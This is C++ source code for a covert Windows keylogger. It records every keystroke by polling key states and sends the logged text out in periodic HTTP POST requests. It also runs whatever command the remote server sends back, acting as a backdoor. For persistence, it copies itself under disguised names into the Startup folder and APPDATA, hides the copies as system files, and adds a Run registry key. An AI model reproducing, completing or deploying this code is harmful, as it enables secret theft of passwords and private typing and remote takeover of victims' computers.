#include "stdafx.h"
#include "Keylogger.h"
#include "Hax.h"
#include "Network.h"
#include "Settings.h"

#pragma comment(lib, "Ws2_32.lib")

Keylogger keylogger;

const int V_KEY_BEGIN   = 0x08; // [BACK]
const int V_KEY_END     = 0x91; // [SCROLLLOCK]

// http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
const char* keyStrings[] =
{
	0, 0, 0, 0, 0, 0, 0, 0, "[BACK]", "[TAB]", 0, 0, 0, "[ENTER]", 0, 0,
	"[SHIFT]", "[CTRL]", "[ALT]", "[PAUSE]", "[CAPS]", 0, 0, 0, 0, 0, 0, "[ESC]", 0, 0, 0, 0,
	" ", "[PGUP]", "[PGDOWN]", "[END]", "[HOME]", "[<]", "[^]", "[>]", "[v]", "[SELECT]", "[PRINT]", "[EXECUTE]", "[PRINTSCREEN]", "[INS]", "[DEL]", "[HELP]",
	"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", 0, 0, 0, 0, 0, 0,
	0, "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O",
	"P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "[LWIN]", "[RWIN]", "[APPS]", 0, "[SLEEP]",
	"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+", 0, "-", ".", "/",
	"[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]", "[F13]", "[F14]", "[F15]", "[F16]",
	"[F17]", "[F18]", "[F19]", "[F20]", "[F21]", "[F22]", "[F23]", "[F24]", 0, 0, 0, 0, 0, 0, 0, 0,
	"[NUMLOCK]", "[SCROLLLOCK]", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};
const char* keyStringsNoShift[] =
{
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o",
	"p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};

Keylogger::Keylogger() : shouldStop(false)
{
	memset(keysActive, false, sizeof(keysActive));

	GetModuleFileName(NULL, exeName, MAX_PATH);

	TCHAR *appData;
	size_t appDataSize;
	_tdupenv_s(&appData, &appDataSize, _T("APPDATA"));

	appDataPath[0] = '\0';
	_tcscat_s(appDataPath, appData);
	_tcscat_s(appDataPath, _T("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" V_FAKE_NAME1));
	
	registryPath[0] = '\0';
	_tcscat_s(registryPath, appData);
	_tcscat_s(registryPath, _T("\\" V_FAKE_NAME2));

	free(appData);
}
Keylogger::~Keylogger()
{

}

void Keylogger::Run()
{
	DWORD ticksLast = GetTickCount();

	for (;;)
	{
		Sleep(V_IDLE_TIME);

		if (GetTickCount() - ticksLast >= V_SEND_INTERVAL)
		{
			this->Send();
			keysPressed.clear();

			if (this->shouldStop)
				break;

			ticksLast = GetTickCount();
		}

		bool shift = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
					^ ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
		for(int i = V_KEY_BEGIN; i <= V_KEY_END; i++)
		{
			this->CheckKey(i, shift);
		}
	}
}
void Keylogger::Stop()
{
	this->shouldStop = true;
}

bool Keylogger::SetAutorun(bool autorun)
{
	return SetAutorunAppdata(autorun) | SetAutorunRegistry(autorun);
}

bool Keylogger::CopyTo(TCHAR* path)
{
	if (GetFileAttributes(path) != INVALID_FILE_ATTRIBUTES)
	{
		return true;
	}
	else if (CopyFile(exeName, path, FALSE))
	{
		SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		return true;
	}
	else
	{
		Error(_T("Failed to copy file"));
		return false;
	}
}
bool Keylogger::SetAutorunAppdata(bool autorun)
{
	if (autorun)
	{
		return this->CopyTo(appDataPath);
	}
	else
	{
		return DeleteFile(appDataPath) != 0;
	}
}
bool Keylogger::SetAutorunRegistry(bool autorun)
{
	HKEY hKey;

	if(RegCreateKeyEx(HKEY_LOCAL_MACHINE,
		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)
			!= ERROR_SUCCESS)
	{
		return false;
	}

	bool ret = false;

	if (autorun)
	{
		if (!this->CopyTo(registryPath))
		{
			goto g_end;
		}
	
		if (RegSetValueEx(hKey, V_FAKE_NAME2, 0, REG_SZ,
			(const BYTE*)registryPath, (lstrlen(registryPath) + 1) * sizeof(TCHAR))
				!= ERROR_SUCCESS)
		{
			goto g_end;
		}
	}
	else
	{
		RegDeleteValue(hKey, V_FAKE_NAME2);

		if (!DeleteFile(registryPath))
		{
			goto g_end;
		}
	}

	ret = true;
g_end:
	RegCloseKey(hKey);
	return ret;
}

void Keylogger::CheckKey(short i, bool shift)
{
	if (GetAsyncKeyState(i) & 0x8000)
	{
		if (!keysActive[i])
		{
			keysActive[i] = true;
			
			const char* str     = keyStrings[i];
			const char* str_ns  = keyStringsNoShift[i];
			if (str_ns && !shift)
			{
				keysPressed.push_back(str_ns);
			}
			else if (str)
			{
				keysPressed.push_back(str);
			}
		 }
	}
	else
	{
		keysActive[i] = false;
	}
}

void Keylogger::Send()
{
	std::string msgText = "d=";

	std::vector<const char*>::const_iterator itr;
	for (   itr = keysPressed.begin();
			itr != keysPressed.end();
			itr++)
	{
		msgText += *itr;
	}

	size_t response_len;
	char *response_start;

	bool ret = network.SendPost(sendBuf, sizeof(sendBuf)-1, &response_len, (const char**)&response_start, msgText.c_str(), msgText.size(), true);
	if (ret)
	{
		response_start[response_len] = '\0';
		cmd.Run(response_start);
	}

	return;
}